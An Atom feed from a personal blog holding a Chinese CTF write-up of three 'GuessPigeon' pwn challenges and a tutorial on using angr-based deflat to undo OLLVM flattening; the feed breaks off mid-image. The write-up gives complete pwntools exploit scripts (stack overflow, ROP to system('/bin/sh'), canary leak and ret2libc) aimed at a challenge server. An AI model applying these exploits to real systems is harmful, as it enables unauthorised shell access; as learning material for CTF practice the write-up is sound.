<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mrh929&#39;s home</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mrh1s.top/"/>
  <updated>2019-09-14T04:00:01.390Z</updated>
  <id>https://mrh1s.top/</id>
  
  <author>
    <name>mrh929</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CNSS-PWN招新三部曲</title>
    <link href="https://mrh1s.top/posts/7c773b71/"/>
    <id>https://mrh1s.top/posts/7c773b71/</id>
    <published>2019-09-14T03:10:15.000Z</published>
    <updated>2019-09-14T04:00:01.390Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CNSS-PWN"><a href="#CNSS-PWN" class="headerlink" title="CNSS-PWN"></a>CNSS-PWN</h1><h2 id="GuessPigeon"><a href="#GuessPigeon" class="headerlink" title="GuessPigeon"></a>GuessPigeon</h2><h3 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">guess</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"My Gooood!You guessed the pigeon number!!"</span>);</span><br><span class="line">    getshell();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You are wrong!The pigeon's number is %d\n try again~"</span>, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见 scanf处没有限制字符串长度大小，可以通过该处进行栈溢出</p><p>a1是调用guess函数时传入的参数，存在栈里面</p><p>nptr为输入的字符串，也存在栈里面</p><p>可知进行栈溢出可以将a1和nptr覆盖成一样的形式，从而getshell</p><p>虽然这道题有canary，但是并没有起到作用</p><blockquote><p>char nptr; // [esp+8h] [ebp-70h]</p><p>题外话：关于padding的长度，<strong>一定要用gdb调试后算出来！！</strong></p><p>用ida眼睛看的十有八九都是错的！！</p></blockquote><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"132.232.34.26"</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your token:'</span>)</span><br><span class="line">p.sendline(<span class="string">"GuessPigeon"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'123'</span> + <span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x74</span></span><br><span class="line">payload += p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="GuessPigeon2"><a href="#GuessPigeon2" class="headerlink" title="GuessPigeon2"></a>GuessPigeon2</h2><h3 id="analyze-1"><a href="#analyze-1" class="headerlink" title="analyze"></a>analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've been fooled.There are no pigenos here!\n Good bye~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to get hint? yes/no?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;buf, <span class="string">"yes"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">"Do you know \"%s\"\n"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的ELF文件是64位的，传参方式为寄存器传参，这意味着我们需要用到ROP链来构造一段代码把参数传到寄存器里面去</p><h4 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary GuessPigeon2 --only <span class="string">'pop|ret'</span> | grep <span class="string">'rdi'</span></span><br></pre></td></tr></table></figure><blockquote><p>0x0000000000400933 : pop rdi ; ret</p></blockquote><h4 id="binsh"><a href="#binsh" class="headerlink" title="binsh"></a>binsh</h4><p>同时 字符串s刚好指向了 /bin/sh，利用system(s)可以getshell</p><p>查询了一下，system函数刚好存在于elf文件中，直接引用即可</p><blockquote><p>0x400650</p></blockquote><p>程序执行完guess之后，会跳到pop_rdi_ret的函数处，将rdi赋值为s的地址，接着调用system()，从而getshell</p><h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./GuessPigeon2')</span></span><br><span class="line">p = remote(<span class="string">'132.232.34.26'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400933</span></span><br><span class="line">system_addr = <span class="number">0x400650</span></span><br><span class="line">binsh_addr = <span class="number">0x600E20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x78</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'input your token:'</span>)</span><br><span class="line">p.sendline(<span class="string">'GuessPigeon2'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your guess:"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Do you want to get hint? yes/no?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="GuessPigeon3"><a href="#GuessPigeon3" class="headerlink" title="GuessPigeon3"></a>GuessPigeon3</h2><h3 id="analyze-2"><a href="#analyze-2" class="headerlink" title="analyze"></a>analyze</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You You have two chances. Please input your guess:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You guessed the pigeon number is %s .\nI'm sorry, you guessed wrong."</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your guess again:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've been fooled.There are no pigenos here!\n Good bye~"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们checksec一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">'/home/mrh929/Desktop/cnss/GuessPigeon3/GuessPigeon3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序开启了Canary和栈不可执行，guess函数中有两个read函数，即有两个溢出点</p><p>第一个溢出点的后面紧跟着一个printf，推测可能是用来泄露canary用的</p><h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p><p><strong>canary</strong>是一种防止栈溢出的方式，通过在执行函数之前生成一个随机的canary，可以防止在函数结束之前有人通过read, scanf等不安全的函数进行栈溢出攻击，程序结束时会<strong>stack_check_fail</strong>，一旦canary被改变，程序将会马上退出</p><p><strong>canary</strong>的特点是最低位为0, eg: 0x49d8c100 ，本意是将printf截断，我们在用padding填充的时候可以sendline，即在最后一位填上一个’\n’，就可以做到将canary输出，当然最后要记得canary = out - ‘a’</p><h4 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h4><p>程序中没有给出system函数和/bin/sh字符串</p><p>但是给了一个libc文件，libc文件是一个动态链接库，程序通过读取这个动态链接库来执行它想要的函数</p><p>当然这个动态链接库的地址就<strong>不是固定的了</strong>，虽然我们静态分析的时候会得到一个<strong>静态的地址</strong>，但这个并不是动态链接库的最终地址，我们需要将程序运行之后某个libc函数的地址泄露出来，算出它与libc中的静态地址的偏移，从而得到libc中每个函数的真实地址</p><h4 id="plt-got"><a href="#plt-got" class="headerlink" title="plt got"></a>plt got</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table</a></p><p>plt的本质上是一个指向got表的指针，系统调用函数的时候会首先jmp plt，由plt进行push ，再jmp的操作，最终读取到got表，将eip指向函数的真实地址。</p><p>这个生成got表的动作是<strong>动态</strong>的，所以在我们没有调用某个函数时这个函数的got表将<strong>不存有任何地址信息</strong>。我们想要得到某个libc函数的真实地址，最好的方法是找准一个已经被系统执行的函数，查询它的got表，从而得到这个函数的真实地址。</p><p>这道题中puts和read函数都是被程序执行过的，我们随意选取一个函数</p><p>用  <strong>elf.got[‘puts’]</strong> 调出got表地址，利用write<strong>（三个参数）</strong>或者puts<strong>（一个参数）</strong>函数将其输出</p><p>相当于把guess函数的返回地址设置为write/puts</p><blockquote><p>注意，这里调用write/puts函数的本质也是调用plt表，在汇编层面其实等价于jmp addr</p><p>而这些函数都是需要ret/ leave 的，所以相应的我们应当在 write_plt 后面<strong>先加入一个 ret_addr</strong> ，再push 参数</p></blockquote><h4 id="after-that"><a href="#after-that" class="headerlink" title="after that"></a>after that</h4><p>同样的，注意canary 和 write_plt之间也有12个字节的padding，我第一次做这题的时候也是在padding上面卡了很久，一定要用gdb仔细调试才能得出padding长度！！</p><p>ret_addr可以设置为guess，因为guess函数有两个溢出点，可以继续栈溢出</p><p>在我们得到read的真实地址之后，我们就可以通过</p><p><strong>read_addr - libc.symbols[‘read’]</strong> </p><p>来得出偏移offset了，现在我们就可以知道任何一个函数的真实地址了</p><p>再执行一遍guess，同样的要获取canary并且构造payload。</p><p>最后压入/bin/sh参数，执行system()</p><h4 id="little-trick"><a href="#little-trick" class="headerlink" title="little trick"></a>little trick</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">pwnlib.gdb.attach(process)</span><br></pre></td></tr></table></figure><p>可以对pwntools的过程进行调试</p><h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./GuessPigeon3')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'132.232.34.26'</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">'token:'</span>)</span><br><span class="line">p.sendline(<span class="string">'GuessPigeon3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./GuessPigeon3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret_addr = elf.symbols[<span class="string">'guess'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> *<span class="number">100</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment">#get canary value</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary = "</span> + str(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">100</span> + p32(canary) + <span class="string">'b'</span>* <span class="number">12</span></span><br><span class="line">payload2 += p32(puts_plt) + p32(ret_addr) + p32(write_got)  </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your guess again:"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Good bye~\n'</span>)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_read_addr = "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># return to guess()</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'c'</span> * <span class="number">100</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(payload3)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment">#another canary</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary' = "</span> + str(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_binsh = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">offset = write_addr - libc_write <span class="comment">#offset between real_addr and libc_addr</span></span><br><span class="line">system_addr = offset + libc_system</span><br><span class="line">binsh_addr = offset + libc_binsh</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">'d'</span>*<span class="number">100</span> + p32(canary)</span><br><span class="line">payload4 += <span class="string">'b'</span>*<span class="number">12</span></span><br><span class="line">payload4 += p32(system_addr) + p32(ret_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'again:'</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="cnss_recruit_201809" scheme="https://mrh1s.top/categories/write-up/cnss-recruit-201809/"/>
    
    
      <category term="pwn_stack_overflow" scheme="https://mrh1s.top/tags/pwn-stack-overflow/"/>
    
      <category term="pwn_canary" scheme="https://mrh1s.top/tags/pwn-canary/"/>
    
  </entry>
  
  <entry>
    <title>deflat</title>
    <link href="https://mrh1s.top/posts/77b618a/"/>
    <id>https://mrh1s.top/posts/77b618a/</id>
    <published>2019-09-08T15:22:00.000Z</published>
    <updated>2019-09-08T15:55:32.625Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="deflat"><a href="#deflat" class="headerlink" title="deflat"></a>deflat</h1><h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>前面谈到了利用<strong>ollvm</strong>可以对控制流进行混淆、平坦化，有正向必有逆向，有人利用angr模块写出了一个将混乱的控制流进行恢复，转化为可读的正常程序的脚本</p><h2 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h2><h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>angr是一个python模块，需要通过pip安装，然而安装时有可能会破坏原有其他模块的环境，所以angr官方文档提出应当使用虚拟python环境来安装angr。</p><p>亲测直接pip install anagr是不起作用的</p><p>官方文档可参考：<a href="https://docs.angr.io/introductory-errata/install" target="_blank" rel="noopener">https://docs.angr.io/introductory-errata/install</a></p><p><strong>安装步骤</strong></p><p>安装virtualenvwrapper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span><br></pre></td></tr></table></figure><p>构建虚拟环境</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkvirtualenv --python=$(<span class="built_in">which</span> python3) angr &amp;&amp; pip install angr</span><br></pre></td></tr></table></figure><p>如果系统提示mkvirtualenv : command not found， 参考如下这篇文章进行修复</p><p><a href="https://blog.csdn.net/qq_44090577/article/details/90756207" target="_blank" rel="noopener">https://blog.csdn.net/qq_44090577/article/details/90756207</a></p><p>安装好之后，就可以开始正常运行脚本了</p><h3 id="deflat-py"><a href="#deflat-py" class="headerlink" title="deflat.py"></a>deflat.py</h3><p>clone deflat的相关脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mrh929/deflat</span><br></pre></td></tr></table></figure><h2 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h2><h3 id="deflat-1"><a href="#deflat-1" class="headerlink" title="deflat"></a>deflat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 deflat.py [file_name] [start_addr]</span><br></pre></td></tr></table></figure><blockquote><p><code>0x400660 是函数</code>main()`的地址。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(angr) root@ubuntu:~/Desktop/deflat/test# python3 deflat.py esay_obfuscation 0x400660</span><br><span class="line">*******************relevant blocks************************</span><br><span class="line">prologue: 0x400660</span><br><span class="line">main_dispatcher: 0x40072a</span><br><span class="line">pre_dispatcher: 0x400926</span><br><span class="line">retn: 0x40091a</span><br><span class="line">relevant_blocks: ['0x4008a3', '0x4008b8', '0x400855', '0x40083d', '0x400868', '0x400909', '0x400820', '0x4008f8', '0x400881', '0x400816']</span><br><span class="line">*******************symbolic execution*********************</span><br><span class="line">-------------------dse 0x4008a3---------------------</span><br><span class="line">-------------------dse 0x4008b8---------------------</span><br><span class="line">CRITICAL | 2019-09-08 08:46:50,813 | angr.sim_state | The name state.se is deprecated; please use state.solver.</span><br><span class="line">-------------------dse 0x400855---------------------</span><br><span class="line">-------------------dse 0x40083d---------------------</span><br><span class="line">-------------------dse 0x400868---------------------</span><br><span class="line">-------------------dse 0x400909---------------------</span><br><span class="line">-------------------dse 0x400820---------------------</span><br><span class="line">-------------------dse 0x4008f8---------------------</span><br><span class="line">-------------------dse 0x400881---------------------</span><br><span class="line">-------------------dse 0x400816---------------------</span><br><span class="line">-------------------dse 0x400660---------------------</span><br><span class="line">************************flow******************************</span><br><span class="line">0x4008a3:  ['0x400868']</span><br><span class="line">0x4008b8:  ['0x4008f8', '0x400909']</span><br><span class="line">0x400855:  ['0x400868']</span><br><span class="line">0x40083d:  ['0x40091a']</span><br><span class="line">0x400868:  ['0x400881', '0x4008b8']</span><br><span class="line">0x400909:  ['0x40091a']</span><br><span class="line">0x400820:  ['0x40083d', '0x400855']</span><br><span class="line">0x4008f8:  ['0x40091a']</span><br><span class="line">0x400881:  ['0x4008a3']</span><br><span class="line">0x400816:  ['0x4008a3']</span><br><span class="line">0x400660:  ['0x400820']</span><br><span class="line">0x40091a:  []</span><br><span class="line">************************patch*****************************</span><br><span class="line">Successful! The recovered file: esay_obfuscation_recovered</span><br></pre></td></tr></table></figure><p><strong>原二进制文件（no flat）</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/09/08/kFiOs7ApN4U92wx.png" alt="image.png"></p><p><strong>deflat 后的二进制文件</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqz